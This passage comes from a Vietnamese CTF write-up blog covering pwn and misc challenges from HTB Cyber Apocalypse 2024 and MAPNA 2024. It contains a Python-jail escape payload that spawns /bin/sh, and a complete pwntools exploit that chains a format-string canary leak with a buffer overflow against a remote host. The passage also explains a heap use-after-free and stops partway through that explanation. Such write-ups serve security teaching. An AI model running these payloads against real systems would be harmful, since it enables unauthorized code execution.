⠀⢰⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠃⠈⢿⣿⣧⣄⠀⠀⠰⣦⣀⣭⡿⣟⣍⣀⣿⠆⠀⠀⡀⣠⣼⣿⠁⠀⠀⠀⠀⠀⠀⠀⢀⣤⣽⣷⣤⣤⠀⠀⠀⠀⠀ ⠀⢀⣿⡆⠀⠀⠀⢀⣀⠀⠀⠀⠀⠀⠀⢀⣴⠖⠋⠁⠈⠻⣿⣿⣿⣶⣶⣤⡉⠉⠀⠈⠉⢉⣀⣤⣶⣶⣿⣿⣿⠃⠀⠀⠀⠀⢀⡴⠋⠀⠀⠀⠀⠀⠉⠻⣷⣄⠀⠀⠀ ⠀⣼⡏⣿⠀⢀⣤⠽⠖⠒⠒⠲⣤⣤⡾⠋⠀⠀⠀⠀⠀⠈⠈⠙⢿⣿⣿⣿⣿⣿⣾⣷⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠀⣀⣤⠶⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣧⠀⠀ ⢰⣿⠁⢹⠀⠈⠀⠀⠀⠀⠀⠀⠀⣿⠷⠦⠄⠀⠀⠀⠀⠀⠀⠀⠘⠛⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠉⢀⣠⠶⠋⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣧⠀ ⣸⡇⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⠀⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠉⠉⠛⠋⠉⠙⢧⠀⠀⢸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡆ ⣿⡇⠀⠀⠈⠆⠀⠀⣠⠟⠀⠀⠀⢸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⢿⠀⠀⠀⠀⠀⠀⠀⠈⠱⣄⣸⡇⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣻⡇ ⢻⣧⠀⠀⠀⠀⠀⣸⣥⣄⡀⠀⠀⣾⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⠂⠀⠀⠀⠀⠀⠀⣿⡇ ⢸⣿⣦⠀⠀⠀⠚⠉⠀⠈⠉⠻⣾⣿⡏⢻⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣟⢘⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⢳⡄⠀⠀⠀⠀⠀⠀⠀⠀⠐⡟⠀⠀⠀⠀⠀⠀⢀⣿⠁ ⢸⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣇⠈⠻⠷⠦⠤⣄⣀⣀⣀⣀⣠⣿⣿⣄⠀⠀⠀⠀⠀⣠⡾⠋⠄⠀⠈⢳⡀⠀⠀⠀⠀⠀⠀⠀⣸⠃⠀⠀⠀⠀⠀⠀⣸⠟⠀ ⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⣔⠢⠤⠤⠀⠀⠈⠉⠉⠉⢤⠀⠙⠓⠦⠤⣤⣼⠋⠀⠀⠀⠀⠀⠀⠹⣦⠀⠀⠀⠀⠀⢰⠏⠀⠀⠀⠀⠀⢀⣼⡟⠀⠀ ⠀⢻⣷⣖⠦⠄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⠈⢳⡀⠈⠛⢦⣀⡀⠀⠀⠘⢷⠀⠀⠀⢀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡄⠀⠀⣠⠏⠀⠀⠀⠀⣀⣴⡿⠋⠀⠀⠀ ⠀⠀⠙⠻⣦⡀⠈⠛⠆⠀⠀⠀⣠⣤⡤⠀⠿⣤⣀⡙⠢⠀⠀⠈⠙⠃⣠⣤⠾⠓⠛⠛⢿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡴⠞⠁⢀⣠⣤⠖⢛⣿⠉⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠈⠙⢷⣤⡁⠀⣴⠞⠁⠀⠀⠀⠀⠈⠙⠿⣷⣄⣀⣠⠶⠞⠋⠀⠀⠀⠀⠀⠀⢻⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠶⠞⠋⠁⠀⢀⣾⠟⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠉⠻⣷⡷⠀⠀⠀⠀⠀⠀⠀⠀⠀⢙⣧⡉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠢⣤⣀⣀⠀⠀⠈⠂⢀⣤⠾⠋⠀⠀⠀⠀⠀⣠⡾⠃⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⢀⣠⠎⣠⡾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣧⠀⣦⠀⠀⠀⠀⠀⠀⠀⣿⣇⢠⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠤⢐⣯⣶⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣄⠸⣆⠀⠀⠲⣆⠀⠀⢸⣿⣶⣮⣉⡙⠓⠒⠒⠒⠒⠒⠈⠉⠁⠀⠀⠀⠀⠀⢀⣶⣶⡿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠷⠾⠷⣦⣾⠟⠻⠟⠛⠁⠀⠈⠛⠛⢿⣶⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⣨⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠙⠛⠛⠛⠻⠿⠿⠿⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ \u0026#39;\u0026#39;\u0026#39; blacklist = [ \u0026#39;;\u0026#39;, \u0026#39;\u0026#34;\u0026#39;, \u0026#39;os\u0026#39;, \u0026#39;_\u0026#39;, \u0026#39;\\\\\u0026#39;, \u0026#39;/\u0026#39;, \u0026#39;`\u0026#39;, \u0026#39; \u0026#39;, \u0026#39;-\u0026#39;, \u0026#39;!\u0026#39;, \u0026#39;[\u0026#39;, \u0026#39;]\u0026#39;, \u0026#39;*\u0026#39;, \u0026#39;import\u0026#39;, \u0026#39;eval\u0026#39;, \u0026#39;banner\u0026#39;, \u0026#39;echo\u0026#39;, \u0026#39;cat\u0026#39;, \u0026#39;%\u0026#39;, \u0026#39;\u0026amp;\u0026#39;, \u0026#39;\u0026gt;\u0026#39;, \u0026#39;\u0026lt;\u0026#39;, \u0026#39;+\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;2\u0026#39;, \u0026#39;3\u0026#39;, \u0026#39;4\u0026#39;, \u0026#39;5\u0026#39;, \u0026#39;6\u0026#39;, \u0026#39;7\u0026#39;, \u0026#39;8\u0026#39;, \u0026#39;9\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;s\u0026#39;, \u0026#39;lower\u0026#39;, \u0026#39;upper\u0026#39;, \u0026#39;system\u0026#39;, \u0026#39;}\u0026#39;, \u0026#39;{\u0026#39; ] while True: ans = input(\u0026#39;Break me, shake me!\\n\\n$ \u0026#39;).strip() if any(char in ans for char in blacklist): print(f\u0026#39;\\n{banner1}\\nNaughty naughty..\\n\u0026#39;) else: try: eval(ans + \u0026#39;()\u0026#39;) print(\u0026#39;WHAT WAS THAT?!\\n\u0026#39;) except: print(f\u0026#34;\\n{banner2}\\nI\u0026#39;m UNBREAKABLE!\\n\u0026#34;) Kinh nghiệm của mình đổi với mấy bài pyjail mà không có filter ký tự unicode như thế này thì cứ abuse trò eval(input()) thôi. Mình thì thường hay xài cái web này để tạo payload unicode.\nNgoài ra thì nhớ thêm dấu # ở cuối để nó comment đi cái string \u0026ldquo;()\u0026rdquo; bị ghép vào input của mình.\n$ nc 94.237.54.153 38026 Break me, shake me! $ 𝔢𝔳𝔞𝔩(𝔦𝔫𝔭𝔲𝔱())# __import__(\u0026#39;os\u0026#39;).system(\u0026#39;/bin/sh\u0026#39;) ls flag.txt main.py cat flag.txt HTB{3v4l_0r_3vuln??} Flag: HTB{3v4l_0r_3vuln??}\n","date":"14 March 2024","externalUrl":null,"permalink":"/writeup/hackthebox-2024/","section":"","summary":"Writeup cho các thử thách của giải HTBCTF Cyber Apocalypse 2024: Hacker Royale.","title":"Hack The Box CTF 2024 - PWN \u0026 MISC writeup","type":"writeup"},{"content":"","date":"14 March 2024","externalUrl":null,"permalink":"/tags/hackthebox/","section":"Tags","summary":"","title":"Hackthebox","type":"tags"},{"content":"","date":"14 March 2024","externalUrl":null,"permalink":"/tags/pwn/","section":"Tags","summary":"","title":"Pwn","type":"tags"},{"content":"","date":"21 January 2024","externalUrl":null,"permalink":"/tags/ctf/","section":"Tags","summary":"","title":"Ctf","type":"tags"},{"content":"","date":"21 January 2024","externalUrl":null,"permalink":"/tags/mapna/","section":"Tags","summary":"","title":"MAPNA","type":"tags"},{"content":"\rninipwn #\rMô tả: pwn ^ pwn ^ pwn ^ pwn ^ pwn ^ pwn\nKiểm tra sơ bộ #\rĐề cung cấp 2 file binary ninipwn và Dockerfile nhưng tạm thời mình sẽ không quan tâm đến file Dockerfile này trừ khi cần sử dụng đến libc.\nSử dụng checksec lên file ninipwn cho chúng ta kết quả như sau:\nArch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Tiếp theo mình sẽ check sâu hơn vào file chương trình mà đề cho.\nPhân tích source code #\rChương trình có 3 hàm quan trọng cần chú ý là main, encryption_service, encrypt và 1 hàm win chính là target mà chúng ta cần phải gọi tới.\nHàm main của chương trình như sau:\nint __fastcall main(int argc, const char **argv, const char **envp) { disable_io_buffering(argc, argv, envp); puts(\u0026#34;XOR encryption service\u0026#34;); encryption_service(); return 0; } Hàm disable_io_buffering chủ yếu để set buffer cho stdin, stdout và stderr cho việc connect trên remote nên chúng ta không cần phải quan tâm quá nhiều.\nTiếp theo là hàm encryption_service:\nunsigned __int64 encryption_service() { char buf[264]; // [rsp+0h] [rbp-110h] BYREF unsigned __int64 v2; // [rsp+108h] [rbp-8h] v2 = __readfsqword(0x28u); printf(\u0026#34;Text length: \u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;text_length); getchar(); if ( (unsigned int)text_length \u0026lt; 257 ) { printf(\u0026#34;Key: \u0026#34;); read(0, key, 10uLL); printf(\u0026#34;Key selected: \u0026#34;); printf(key); putchar(0xA); printf(\u0026#34;Text: \u0026#34;); read(0, buf, text_length); encrypt((__int64)buf); printf(\u0026#34;Encrypted output: \u0026#34;); write(1, buf, text_length); } else { puts(\u0026#34;Text length must be less than 256\u0026#34;); } return v2 - __readfsqword(0x28u); } Hàm hay sẽ đọc input lần lượt 3 thứ: biến global text_length chứa độ dài cần đọc của biến buf, biến global key và biến local buf.\nChương trình sẽ kiểm tra biến text_length không được vượt quá 256 để chống stack overflow trên biến buf. Vậy nghĩa là chúng ta phải tìm cách bypass được cái check này hoặc tìm cách exploit khác.\nNgoài ra thì hàm này còn dính phải lỗi format string khi nó gọi printf thẳng lên biến key mà người dùng input. Mình đoán là sẽ phải tận dụng lỗi này để leak một giá trị nào đó vì độ dài của biến key có giới hạn nên khó có thể khai thác lỗi này để ghi đè lên đâu đó được.\nTiếp theo thì chương trình sẽ mang biến buf pass vào hàm encrypt.\n__int64 __fastcall encrypt(__int64 a1) { __int64 result; // rax int i; // [rsp+14h] [rbp-4h] for ( i = 0; ; ++i ) { result = (unsigned int)text_length; if ( i \u0026gt;= text_length ) { break; } *(_BYTE *)(i + a1) ^= key[i % 8]; } return result; } Hàm này không có gì đặc biệt ngoài việc nó mã hóa chuỗi truyền vào bằng cách mang XOR với 8 ký tự của biến key.\nTới đây thì mình chợt nhận ra một điều là trong hàm encryption_service chương trình yêu cầu nhập tối đa 10 ký tự cho biến key nhưng trong hàm encrypt lại chỉ sử dụng 8 ký tự để XOR. Nên là mình đã check xem địa chỉ của biến key này nằm như thế nào trên memory.\n.bss:0000000000004050 public key .bss:0000000000004050 ; char key[8] .bss:0000000000004050 key db 8 dup(?) ; DATA XREF: encrypt+35↑o .bss:0000000000004050 ; encryption_service+99↑o .bss:0000000000004050 ; encryption_service+C1↑o .bss:0000000000004058 public text_length .bss:0000000000004058 text_length dd ? Chúng ta có thể dễ dàng nhận thấy rằng địa chỉ của biến key nằm ở địa chỉ 0x4050 trong khi biến text_length nằm tại 0x4058. 2 biến này cách nhau chỉ 8 byte nhưng chương trình lại đọc tận 10 byte vào biến key.\nĐồng thời chương trình chỉ đọc input vô biến key sau khi đã kiểm tra giá trị của biến text_length nên chúng ta hoàn toàn có thể tận dụng lỗi này để ghi đè lên biến text_length thông qua việc đọc input vào biến key, từ đó khiến text_length mang giá trị đủ lớn để overflow thông qua biến buf nằm trên stack.\nLên kịch bản khai thác #\rVì hàm main và win chỉ cách biệt nhau đúng 1 byte nên việc chương trình bật chế độ bảo vệ PIE không phải vấn đề cần lo lắng vì chúng ta chỉ cần ghi đè lên byte cuối cùng của địa chỉ trả về của hàm encryption_service mà không cần quan tâm đến các byte ngẫu nhiên sau đó.\nNgoài ra, chúng ta cũng cần phải kiểm soát được giá trị sẽ ghi đè lên biến text_length do tính chất của hàm encrypt sẽ thực hiện phép XOR lên text_length ký tự trên stack nên để tránh việc hàm encrypt thực hiện phép XOR lên các byte ngẫu nhiên của địa chỉ trả về từ đó khiến chương trình bị lỗi. Vậy nên mình sẽ chỉ set giá trị của text_length bằng đúng với độ dài của payload.\nTuy nhiên như đã thấy ở bước kiểm tra sơ bộ, chương trình có bật stack canary nên mình không thể cứ thế mà overflow đại trên stack cho đến khi gặp địa chỉ trả về được. Nên mình có thể tận dụng lỗi format string đã nói ở trên để leak được giá trị canary đang nằm trên stack ra.\nVới tất cả các mảnh ghép đã đầy đủ, điều duy nhất còn lại là viết script khai thác thôi.\nfrom pwn import * context.binary = exe = ELF(\u0026#39;ninipwn\u0026#39;, False) io = remote(\u0026#39;3.75.185.198\u0026#39;, 7000) def encrypt(data, key): assert len(data) == len(key) return xor(data, key) io.sendlineafter(b\u0026#39;: \u0026#39;, b\u0026#39;256\u0026#39;) key = b\u0026#39;%39$lx--\u0026#39; io.sendafter(b\u0026#39;: \u0026#39;, key+b\u0026#39;\\x19\\x01\u0026#39;) # last 2 bytes need to be 0x119 (the length of our payload) so the encrypt function only encrypts our payload io.recvuntil(b\u0026#39;: \u0026#39;) canary = int(io.recvline().split(b\u0026#39;--\u0026#39;)[0], 16) payload = b\u0026#39;\\0\u0026#39;*264 + encrypt(p64(canary), key) + b\u0026#39;\\0\u0026#39;*8 + b\u0026#39;\\x16\u0026#39; # 0x16 ^ \u0026#39;%\u0026#39; = 0x33 aka 1st byte of win function io.sendafter(b\u0026#39;: \u0026#39;, payload) io.interactive() $ python3 exp.py [+] Opening connection to 3.75.185.198 on port 7000: Done [*] Switching to interactive mode Encrypted output: %39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--\\x00\\xe4\u0026lt;\\x9e\\x92JQM%39 $ ls flag.txt ninipwn $ cat flag.txt MAPNA{d1d-y0u-x0r-7h3-r37urn-4ddr355??-a428b23} Buggy Paint #\rMô tả: I wrote a paint for myself but It seems kinda buggy\nKiểm tra sơ bộ #\rĐề cho chúng ta 4 file: binary chall, libc libc.so.6, loader ld-linux-x86-64.so.2 và Dockerfile. Thấy đề cho thẳng file libc như vậy nên là mình cứ dùng pwninit link nó vào file chương trình trước luôn cho chắc.\n$ pwninit bin: ./chall libc: ./libc.so.6 ld: ./ld-linux-x86-64.so.2 unstripping libc https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.35-0ubuntu3.4_amd64.deb warning: failed unstripping libc: failed running eu-unstrip, please install elfutils: No such file or directory (os error 2) copying ./chall to ./chall_patched running patchelf on ./chall_patched $ mv chall_patched chall Sử dụng checksec lên file chall cho chúng ta kết quả như sau:\nArch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b\u0026#39;.\u0026#39; Cũng không khác gì bài trước. Giờ vô kiểm tra chương trình nào.\nPhân tích source code #\rFile chương trình đã bị strip để bỏ đi tên các symbol nên khi ném vào trong các decompiler thì nó sẽ chỉ hiện tên các hàm là 1 mớ gì đó rất khó nhớ nên mình đã ngồi đổi lại tên 1 số hàm dựa trên công dụng và luồng thực thi để tiện quan sát, theo dõi và phân tích hơn.\nĐầu tiên là hàm main:\n__int64 __fastcall main(__int64 a1, char **a2, char **a3) { int v4; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v5; // [rsp+8h] [rbp-8h] v5 = __readfsqword(0x28u); disable_io_buffering(a1, a2, a3); puts(\u0026#34;Welcome to BuggyPaint!\u0026#34;); while ( 1 ) { print_grid(); menu(); v4 = 0xFFFFFFFF; __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;v4); getchar(); switch ( v4 ) { case 1: create_box(); break; case 2: delete_box(); break; case 3: select_box(); break; case 4: edit_selected_box(); break; case 5: show_selected_box(); break; default: puts(\u0026#34;Invalid option\u0026#34;); return 0LL; } } } Hàm print_grid nhìn vô thì thấy 1 mớ hổ lốn nhưng thật ra những gì nó làm chỉ là in ra màn hình khối hộp to tượng trưng cho 1 vùng trống nào đấy giống như bản đồ với format màu các kiểu thôi nên không cần bận tâm tới. Kiểu như thế này nè:\nWelcome to BuggyPaint! ================================== | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | ================================== Hàm menu thì in ra cho chúng ta các option như sau:\nint menu() { puts(\u0026#34;1. create box\u0026#34;); puts(\u0026#34;2. delete box\u0026#34;); puts(\u0026#34;3. select box\u0026#34;); puts(\u0026#34;4. edit selected box\u0026#34;); puts(\u0026#34;5. show selected box\u0026#34;); return printf(\u0026#34;\u0026gt; \u0026#34;); } Các hàm tương ứng với mỗi lựa chọn trong menu như sau:\nunsigned __int64 create_box() { const char *v0; // rax int v2; // [rsp+Ch] [rbp-34h] BYREF unsigned __int64 v3; // [rsp+10h] [rbp-30h] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-28h] BYREF unsigned __int64 v5; // [rsp+20h] [rbp-20h] BYREF unsigned __int64 v6; // [rsp+28h] [rbp-18h] BYREF void *v7; // [rsp+30h] [rbp-10h] unsigned __int64 v8; // [rsp+38h] [rbp-8h] v8 = __readfsqword(0x28u); printf(\u0026#34;x: \u0026#34;); __isoc99_scanf(\u0026#34;%lu\u0026#34;, \u0026amp;v3); printf(\u0026#34;y: \u0026#34;); __isoc99_scanf(\u0026#34;%lu\u0026#34;, \u0026amp;v4); printf(\u0026#34;width: \u0026#34;); __isoc99_scanf(\u0026#34;%lu\u0026#34;, \u0026amp;v5); printf(\u0026#34;height: \u0026#34;); __isoc99_scanf(\u0026#34;%lu\u0026#34;, \u0026amp;v6); printf(\u0026#34;color(1=red, 2=green): \u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;v2); getchar(); if ( v3 \u0026lt;= 31 \u0026amp;\u0026amp; v4 \u0026lt;= 31 \u0026amp;\u0026amp; v5 \u0026lt;= 32 \u0026amp;\u0026amp; v6 \u0026lt;= 32 \u0026amp;\u0026amp; v3 + v5 \u0026lt;= 32 \u0026amp;\u0026amp; v4 + v5 \u0026lt;= 32 ) { if ( v2 \u0026gt; 0 \u0026amp;\u0026amp; v2 \u0026lt;= 2 ) { if ( qword_4060[0x20 * v3 + v4] ) { puts(\u0026#34;The selected cell is full\u0026#34;); } else { v7 = malloc(48uLL); *(_QWORD *)v7 = v3; *((_QWORD *)v7 + 1) = v4; *((_QWORD *)v7 + 3) = v5; *((_QWORD *)v7 + 4) = v6; if ( v2 == 1 ) { v0 = \u0026#34;\\x1B[31m\u0026#34;; } else { v0 = \u0026#34;\\x1B[32m\u0026#34;; } *((_QWORD *)v7 + 2) = v0; *((_QWORD *)v7 + 5) = malloc(v5 * v6); memset(*((void **)v7 + 5), 0, v6 * v5); printf(\u0026#34;content: \u0026#34;); read(0, *((void **)v7 + 5), v6 * v5); qword_4060[0x20 * v3 + v4] = v7; } } else { puts(\u0026#34;Wrong color\u0026#34;); } } else { puts(\u0026#34;Bad dimensions\u0026#34;); } return v8 - __readfsqword(0x28u); } unsigned __int64 delete_box() { unsigned __int64 v1; // [rsp+8h] [rbp-18h] BYREF unsigned __int64 v2; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\u0026#34;x: \u0026#34;); __isoc99_scanf(\u0026#34;%lu\u0026#34;, \u0026amp;v1); printf(\u0026#34;y: \u0026#34;); __isoc99_scanf(\u0026#34;%lu\u0026#34;, \u0026amp;v2); if ( v1 \u0026lt;= 0x1F \u0026amp;\u0026amp; v2 \u0026lt;= 0x1F ) { if ( qword_4060[0x20 * v1 + v2] ) { free(*(void **)(qword_4060[0x20 * v1 + v2] + 0x28LL)); free((void *)qword_4060[0x20 * v1 + v2]); qword_4060[0x20 * v1 + v2] = 0LL; } else { puts(\u0026#34;Empty cell\u0026#34;); } } else { puts(\u0026#34;Bad coordinates\u0026#34;); } return v3 - __readfsqword(0x28u); } unsigned __int64 select_box() { unsigned __int64 v1; // [rsp+8h] [rbp-18h] BYREF unsigned __int64 v2; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\u0026#34;x: \u0026#34;); __isoc99_scanf(\u0026#34;%lu\u0026#34;, \u0026amp;v1); printf(\u0026#34;y: \u0026#34;); __isoc99_scanf(\u0026#34;%lu\u0026#34;, \u0026amp;v2); if ( v1 \u0026lt;= 0x1F \u0026amp;\u0026amp; v2 \u0026lt;= 0x1F ) { if ( qword_4060[0x20 * v1 + v2] ) { qword_6060 = qword_4060[0x20 * v1 + v2]; } else { puts(\u0026#34;Empty cell\u0026#34;); } } else { puts(\u0026#34;Bad coordinates\u0026#34;); } return v3 - __readfsqword(0x28u); } ssize_t edit_selected_box() { printf(\u0026#34;New content: \u0026#34;); return read(0, *(void **)(qword_6060 + 0x28), *(_QWORD *)(qword_6060 + 0x20) * *(_QWORD *)(qword_6060 + 0x18)); } unsigned __int64 show_selected_box() { unsigned __int64 result; // rax unsigned __int64 i; // [rsp+8h] [rbp-18h] size_t n; // [rsp+10h] [rbp-10h] unsigned __int64 v3; // [rsp+18h] [rbp-8h] puts(\u0026#34;Box content:\u0026#34;); n = *(_QWORD *)(qword_6060 + 0x18); v3 = *(_QWORD *)(qword_6060 + 0x20); for ( i = 0LL; ; ++i ) { result = i; if ( i \u0026gt;= v3 ) { break; } write(1, (const void *)(*(_QWORD *)(qword_6060 + 0x28) + n * i), n); putchar(0xA); } return result; } Nhìn qua thì cực kỳ rối mắt luôn đúng không? Nhưng mà mình sẽ tóm tắt lại ở đây cho dễ hiểu.\nĐầu tiên thì bên trong chương trình sẽ khởi tạo 1 mảng 32x32 tạm gọi là map[32][32] (hàm print_grid khi này chính là dùng để in cái mảng này ra nè) và define 1 struct tạm gọi là Box như sau:\nstruct Box { int64_t x; int64_t y; char* color; int64_t width; int64_t height; char* content; }; Trong đó:\nx và y: tọa độ của Box trên mảng color: chứa địa chỉ của chuỗi format màu (đỏ hoặc xanh) trong chương trình width và height: chiều dài và rộng của Box content: chứa địa chỉ của chuỗi nội dung mà người dùng nhập vào cho Box (độ lớn = diện tích Box = width x height) Cơ bản là người dùng sẽ được tạo các Box ở những vị trí cụ thể trên mảng 32x32 và gán nội dung vào bên trong những Box này. Các hàm cụ thể có công dụng như sau:\nHàm create_box:\nYêu cầu nhập vào các thông tin (x, y, width, height, color) của Box muốn tạo Check xem tọa độ đã có Box hay chưa Malloc chunk có size bằng size của struct Box là 48 byte (gọi là chunk struct) Malloc chunk có size bằng diện tích Box (gọi là chunk content) và set vô biến content trong Box Yêu cầu nhập vào content cho Box Set địa chỉ chunk struct lên mảng tại map[x][y] Hàm delete_box:\nYêu cầu nhập vào tọa độ Box cần xóa Check xem tọa độ đã có Box để xóa hay không Free chunk content của Box Free chunk struct của Box Set mảng map[x][y] = 0 Hàm select_box:\nYêu cầu nhập vào tọa độ Box cần xóa Check xem tọa độ có Box hay không Lưu địa chỉ của Box tại map[x][y] vào một biến global qword_6060 (từ giờ sẽ gọi là chosen_box) Hàm edit_selected_box:\nĐọc vào chunk content của chosen_box với số lượng ký tự bằng với diện tích Box Hàm show_selected_box:\nIn ra màn hình nội dung trong content của chosen_box Luồng thực thi chủ yếu của chương trình sẽ dựa vào lựa chọn của người dùng. Nhìn qua thì có vẻ đây là 1 challenge heap cơ bản.\nTuy nhiên thì chương trình sau khi free chunk struct thì sẽ set lại map[x][y] = 0 nhưng nhờ vào biến chosen_box nên chúng ta vẫn có thể sử dụng lại và leak chunk đã được free bằng cách set Box cần leak vào chosen_box trước sau đó free Box này và dùng đến các hàm edit_selected_box và show_selected_box.\nLên kịch bản khai thác #\rTừ khúc này trở xuống khuyến khích các bạn có sẵn nền tảng cơ bản về heap, malloc và tcache\u0026hellip; trước thì sẽ dễ hiểu hơn. Mình sẽ trình bày cách giải theo hướng từ dưới lên nhé.\nVì chương trình sử dụng libc bản về sau nên việc khai thác __free_hook không còn khả thi nữa nên target của chúng ta sẽ là leak địa chỉ stack thông qua symbol __environ trong libc sau đó tạo 1 rop chain trên stack để gọi system.\nMà để có được địa chỉ libc thì mình cần phải leak nó thông qua GOT hoặc vùng nhớ chứa stdin, stdout, stderr trong chương trình. Mà chương trình thì có bật chế độ bảo vệ PIE.\nMình sẽ leak địa chỉ chương trình thông qua vùng nhớ heap. Còn nhớ ban nãy trong struct Box có chứa một biến color chính là địa chỉ chuỗi format màu đỏ hoặc xanh nằm trong chương trình không? Mình sẽ có thể phải bằng cách nào đó leak được địa chỉ này ra.\nVà để leak được địa chỉ này thì đương nhiên không thể thiếu 1 thứ cực kỳ quan trọng chính là địa chỉ heap. Mà để leak được địa chỉ heap thì chúng ta có thể khai thác lỗi UAF (Use After Free) với biến chosen_box như đã nói ở trên để lấy được địa chỉ heap base chính nằm trong chunk đầu tiên sau khi được free.\nĐể hình dung cách hoạt động thì hãy nhìn vào luồng thực thi sau:\nĐầu tiên thì mình sẽ malloc 1 chunk 0 với content size \u0026gt;= 8 (để leak được 8 byte địa chỉ):\nchunk 0: struct chunk 0 -\u0026gt; content chunk 0 chosen_box: tcache Mũi tên (-\u0026gt;) biểu thị con trỏ mà biến content trong struct Box đang trỏ đến. Sau đó mình set chosen_box là chunk 0 này:\nchunk 0: struct chunk 0 -\u0026gt; content chunk 0 chosen_box: struct chunk 0 -\u0026gt; content chunk 0 tcache Tiến hành free chunk 0:\nchunk 0: chosen_box: struct chunk 0 (đã free) -\u0026gt; content chunk 0 (đã free) tcache \u0026lt;- content chunk 0 (đã free) \u0026lt;- struct chunk 0 (đã free) Lúc này thì content chunk 0 đang được tcache dùng chứa địa chỉ heap (heap base \u0026raquo; 12). Chúng ta chỉ cần gọi hàm show_selected_box là đã có thể leak được địa chỉ heap ra ngoài.\nVà khi đã có địa chỉ heap rồi thì chúng ta có thể malloc và free làm sao để khiến cho content chunk của Box này chính là struct chunk của Box khác từ đó thay đổi được địa chỉ content trong struct trỏ đến 1 struct chunk khác để leak địa chỉ chương trình. Tương tự từ địa chỉ chương trình -\u0026gt; địa chỉ libc -\u0026gt; địa chỉ stack.\nĐể hiểu rõ hơn cách hoạt động của cách khai thác này thì chúng ta cũng nhìn qua luồng thực thi sau, giả sử rằng đã biết được địa chỉ heap:\nĐầu tiên thì mình sẽ malloc 2 chunk 0 và 1 với content size khác 48 (là size của struct chunk):\nchunk 0: struct chunk 0 (48 byte) 